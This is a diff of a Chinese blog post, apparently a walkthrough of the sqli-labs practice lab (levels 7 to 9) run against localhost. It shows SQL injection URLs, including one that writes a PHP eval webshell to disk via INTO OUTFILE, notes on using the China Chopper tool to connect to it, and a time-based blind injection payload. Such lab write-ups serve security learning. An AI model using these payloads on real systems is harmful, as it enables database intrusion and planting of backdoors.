@@ -458,7 +458,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-11-21
+                    2020-11-25
                 </div>
                 
 
@@ -565,9 +565,10 @@ union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0
 网页提示用out file来解决<br><a href="https://imgchr.com/i/Dl2BSU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/Dl2BSU.png" alt=""></a></li>
 <li>less7代码:  <pre><code>http://127.0.0.1/sqli-labs/Less-7/?id=-1')) union select 1,2,'&lt;?php @eval($_POST["crow"]); ?&gt;' into outfile  'E:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\a.php' --+</code></pre>注意点  </li>
 <li>本关要构造’))才能形成正确闭合</li>
+<li>要知道文件完整路径才能进行入侵</li>
 <li>把一句话木马写入Less7的文件夹下,然后再用中国菜刀等web工具打开进行入侵 </li>
 </ul>
-<p>中国菜刀的用法:<br>进行木马写入后,比如上面的a.php,然后右键添加,把php文件的网址路径写入,然后密码写在右侧小框里,确认后回到主页点击刚刚添加的那一项就可以进入文件夹了了<br><a href="https://imgchr.com/i/DlgBqA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlgBqA.png" alt=""></a><br><a href="https://imgchr.com/i/DlgyIP" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlgyIP.png" alt=""></a></p>
+<p>中国菜刀的用法:<br>进行木马写入后,比如上面的a.php,然后右键添加,把php文件的网址路径写入,然后密码写在右侧小框里,确认后回到主页点击刚刚添加的那一项就可以进入文件夹了了<br><a href="https://imgchr.com/i/DlgBqA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlgBqA.png" alt=""></a><br><a href="https://imgchr.com/i/DlgyIP" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlgyIP.png" alt=""></a><br><a href="https://imgchr.com/i/Dd91pD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/25/Dd91pD.png" alt="成功连接进入文件管理"></a></p>
 <h2 id="四-less8"><a href="#四-less8" class="headerlink" title="四.less8"></a>四.less8</h2><p>这里采用的是单引号闭合id=’1’,盲注手法同less5</p>
 <p>我这里随便举一个延时注入为例</p>
 <pre><code>http://127.0.0.1/sqli-labs/Less-8/?id=1'  and If(ascii(substr(database(),1,1))=117,1,sleep(5))--+</code></pre><h2 id="五-less9"><a href="#五-less9" class="headerlink" title="五.less9"></a>五.less9</h2><p>这一关我们先加单引号（id=1’）进行测试后发现数据页面正常回显(实际上sql语句也确实是单引号字符型),然后尝试 and sleep(5),发现页面会执行sleep函数,说明存在注入漏洞  </p>
